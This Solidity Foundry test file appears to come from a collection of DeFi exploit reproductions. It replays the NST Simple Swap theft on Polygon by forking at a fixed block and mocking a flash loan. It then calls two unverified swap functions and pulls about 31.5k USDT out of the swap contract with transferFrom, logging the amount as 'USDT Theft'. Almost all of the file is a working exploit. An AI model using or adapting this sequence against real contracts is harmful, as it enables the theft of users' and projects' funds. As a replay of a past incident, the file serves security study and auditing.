// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "./../interface.sol";

// REKT - NST Simple Swap
// Write up Author
// https://twitter.com/eugenioclrc
// Reported on https://discord.com/channels/1100129537603407972/1100129538056396870/1114142216923926528
// @TX
// https://polygonscan.com/tx/0xa1f2377fc6c24d7cd9ca084cafec29e5d5c8442a10aae4e7e304a4fbf548be6d
// https://openchain.xyz/trace/polygon/0xa1f2377fc6c24d7cd9ca084cafec29e5d5c8442a10aae4e7e304a4fbf548be6d
// @Summary
// Milktech is a software company that explores Polygon web3 technologies and recently ventured into
// tokens and token payments. They created a token called NST, which maintains a constant price based
// on USD. Several contracts were developed, with the main one being the swap contract. This contract
// facilitates a straightforward exchange between two tokens: NST (the internal company token) and USDT,
// ensuring a consistent price ratio. NST is an ERC-20 token with an additional role called the Minter,
// allowing specific addresses to mint new tokens. Only the owner of the contract can assign this
// role. The swap contract is ownable and features two primary functions: buyNST, which takes USDT as input,
// and sellNST, which takes NST as input. Additionally, the contract includes the ability to pause trading
// between the tokens. While the token itself was verified, the swap contract was not.

// Exploit Address: https://polygonscan.com/address/0x3bb7a0f2fe88aba35408c64f588345481490fe93
// Attacker Address: https://polygonscan.com/address/0xcb3585f3e09f0238a3f61838502590a23f15bb5b

contract NstExploitTest is Test {
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    IERC20 usdt = IERC20(0xc2132D05D31c914a87C6611C10748AEb04B58e8F);
    IERC20 nst = IERC20(0x83eE54ccf462255ea3Ec56Fa8dE6797d679276e7);

    address swapper = 0x9D101E71064971165Cd801E39c6B07234B65aa88;

    function setUp() public {
        cheats.createSelectFork("polygon", 43_430_814);
        vm.label(address(usdt), "USDT");
        vm.label(address(nst), "NST");
        vm.label(swapper, "swapper");

        assertEq(block.number, 43_430_814);
    }

    function testExploit() public {
        usdt.approve(swapper, type(uint256).max);
        nst.approve(swapper, type(uint256).max);

        // the attacker use balancer to take a flashloan of 40k usd, im gonna mock it
        // to make it simpler to read
        deal(address(usdt), address(this), 40_000_000_000); // 40k usd, usdt has 6 decimals

        (bool ret, bytes memory data) = swapper.call(abi.encodeWithSelector(bytes4(0x6e41592c), 40_000_000_000));
        require(ret, "call failed");
        uint256 retAmount = abi.decode(data, (uint256));

        (ret, data) = swapper.call(abi.encodeWithSelector(bytes4(0x7cd0599b), retAmount));
        require(ret, "call2 failed");

        usdt.transferFrom(swapper, address(this), 31_559_083_207);

        console.log("USDT Theft", usdt.balanceOf(address(this)) - 40_000_000_000);
    }
}
